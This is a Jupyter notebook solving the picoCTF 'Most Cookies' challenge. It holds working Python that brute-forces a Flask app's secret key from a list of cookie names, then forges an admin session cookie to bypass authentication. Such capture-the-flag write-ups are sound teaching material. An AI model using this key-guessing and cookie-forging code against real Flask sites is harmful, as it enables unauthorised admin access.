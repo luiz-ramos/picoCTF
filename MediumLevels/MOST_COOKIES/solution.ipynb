{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0ca72f0a",
   "metadata": {},
   "source": [
    "First, from the `server.py` file, we notice that the secret key used by the app is one of the cookie names provided.  \n",
    "That means we can brute force the process of finding it, which we can then use to forge the \"admin\" cookie, which we can't naturally generate in the app because it is not in the list of cookie names.  \n",
    "\n",
    "To start, we grab a valid cookie from the web app (we can use inspect element to do that, or a tool like BurpSuite), and try to decrypt the cookie session name using the cookie names as possible secret keys:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "ba2d3f82",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Secret_key = 'fortune'\n",
      "Session data: {'very_auth': 'snickerdoodle'}\n"
     ]
    }
   ],
   "source": [
    "from flask import Flask, session, make_response\n",
    "from flask.sessions import SecureCookieSessionInterface\n",
    "from itsdangerous import BadSignature, SignatureExpired\n",
    "\n",
    "# Got this cookie using snickerdoodle as cookie name\n",
    "cookie_value = \"eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aHF2iw.gTUdy2WBUf105p-hWZXRS0Dogcc\"\n",
    "candidates = [\"snickerdoodle\", \"chocolate chip\", \"oatmeal raisin\", \"gingersnap\", \"shortbread\", \"peanut butter\", \"whoopie pie\", \"sugar\", \"molasses\", \"kiss\", \"biscotti\", \"butter\", \"spritz\", \"snowball\", \"drop\", \"thumbprint\", \"pinwheel\", \"wafer\", \"macaroon\", \"fortune\", \"crinkle\", \"icebox\", \"gingerbread\", \"tassie\", \"lebkuchen\", \"macaron\", \"black and white\", \"white chocolate macadamia\"]\n",
    "\n",
    "app = Flask(__name__)\n",
    "session_if = SecureCookieSessionInterface()\n",
    "\n",
    "for key in candidates:\n",
    "    app.secret_key = key\n",
    "    serializer = session_if.get_signing_serializer(app)\n",
    "    try:\n",
    "        data = serializer.loads(cookie_value)\n",
    "        print(f\"Secret_key = {key!r}\")\n",
    "        print(\"Session data:\", data)\n",
    "        break\n",
    "    except BadSignature:\n",
    "        pass\n",
    "    except SignatureExpired:\n",
    "        pass\n",
    "else:\n",
    "    print(\"None of the candidate keys matched.\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52dfdd1b",
   "metadata": {},
   "source": [
    "So now we know the secret key.  \n",
    "All that is left is to forge a fake session with the cookie name of \"admin\", and w.e can get the flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6301347c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aHF3oQ.s_y7WRvVSeiXE4-hB910B4vfD9k\n"
     ]
    }
   ],
   "source": [
    "app.secret_key = \"fortune\"\n",
    "\n",
    "with app.test_request_context(\"/\"):\n",
    "    session[\"very_auth\"] = \"admin\"\n",
    "    resp = make_response(\"OK\")\n",
    "\n",
    "    app.session_interface.save_session(app, session, resp)\n",
    "\n",
    "    # Just tyding up the output\n",
    "    set_cookie = resp.headers.get(\"Set-Cookie\")\n",
    "    session_name = set_cookie.split(';', 1)[0].split('=', 1)[1]\n",
    "\n",
    "    print(session_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "261746f0",
   "metadata": {},
   "source": [
    "And there we have it. Now we just need to exchange our session cookie in the browser with this one and acces the /display subdomain to get the flag."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
